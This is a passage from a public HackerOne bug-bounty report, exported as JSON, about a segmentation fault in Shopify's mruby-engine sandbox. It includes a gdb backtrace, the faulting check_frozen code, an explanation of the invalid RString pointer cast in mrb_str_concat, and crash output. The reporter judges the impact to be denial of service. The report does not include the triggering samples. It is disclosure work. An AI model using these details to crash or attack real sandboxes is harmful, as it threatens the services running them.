bt\n#0  mrb_str_modify (mrb=mrb@entry=0x7ffff23494e0, s=s@entry=0x1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:660\n#1  0x00007ffff37d2688 in mrb_str_concat (mrb=mrb@entry=0x7ffff23494e0, self=..., other=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:758\n#2  0x00007ffff37e27d3 in mrb_vm_exec (mrb=mrb@entry=0x7ffff23494e0, proc=&lt;optimized out&gt;, proc@entry=0x7ffff2351310, pc=&lt;optimized out&gt;) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2219\n#3  0x00007ffff37e6567 in mrb_vm_run (mrb=0x7ffff23494e0, proc=0x7ffff2351310, self=..., stack_keep=stack_keep@entry=0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n#4  0x00007ffff37ba173 in mruby_engine_monitored_eval (data=0x7ffff23493e0) at ../../../../ext/mruby_engine/eval_monitored.c:68\n#5  0x00007ffff7737464 in start_thread (arg=0x7ffff2348700) at pthread_create.c:333\n#6  0x00007ffff6ab330d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109\n</code></pre>\n<p>The crash happens at <code>mruby-engine/ext/mruby_engine/mruby/src/string.c:504</code> which is built inline</p>\n<pre class=\"highlight c\"><code><span class=\"k\">static</span> <span class=\"kt\">void</span>\n<span class=\"nf\">check_frozen</span><span class=\"p\">(</span><span class=\"n\">mrb_state</span> <span class=\"o\">*</span><span class=\"n\">mrb</span><span class=\"p\">,</span> <span class=\"k\">struct</span> <span class=\"n\">RString</span> <span class=\"o\">*</span><span class=\"n\">s</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">RSTR_FROZEN_P</span><span class=\"p\">(</span><span class=\"n\">s</span><span class=\"p\">))</span> <span class=\"p\">{</span>   <span class=\"c1\">// &lt;-- Bug happens here\n</span>    <span class=\"n\">mrb_raise</span><span class=\"p\">(</span><span class=\"n\">mrb</span><span class=\"p\">,</span> <span class=\"n\">E_RUNTIME_ERROR</span><span class=\"p\">,</span> <span class=\"s\">&quot;can&#39;t modify frozen string&quot;</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n</code></pre>\n<p>Actually <code>mrb_str_concat()</code> performs a cast of the argument <code>mrb_value self</code> to a <code>RString *</code> pointer, this generates an invalid pointer which is passed to <code>mrb_str_modify()</code> and later on to <code>check_frozen()</code> which tries to read from it and produces the crash.</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>Its impact seems to be DoS of the service running the sandbox service. I doubt this would be exploitable, but I have seen the memory address being read change in between samples. If an attacker would be able to control this value it could lead to a write-what-where type vulnerability. But I highly doubt this would be possible to control.</p>\n\n<p>Samples generating different invalid addresses have been attached.</p>\n<pre class=\"highlight plaintext\"><code>$ bin/sandbox /tmp/mrb_str_modify.rb 2&gt;&amp;1 | head -1\nbin/sandbox:21: [BUG] Segmentation fault at 0x00000000000003\n$ bin/sandbox /tmp/mrb_str_modify.min.rb 2&gt;&amp;1 | head -1\nbin/sandbox:21: [BUG] Segmentation fault at 0x00000000000001\n</code></pre>", 
    "severity_rating": "high", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.mruby.science", 
            "about": "", 
            "twitter_handle": "", 
            "name": "shopify-scripts"
        }, 
        "handle": "shopify-scripts", 
        "url": "https://hackerone.com/shopify-scripts", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/015/668/9f47d94cbd9e4311b57f1ab05f67fb5c26fd2e78_small.jpg?1475592254", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 15668, 
        "default_currency": "usd"
    }, 
    "is_published": false
}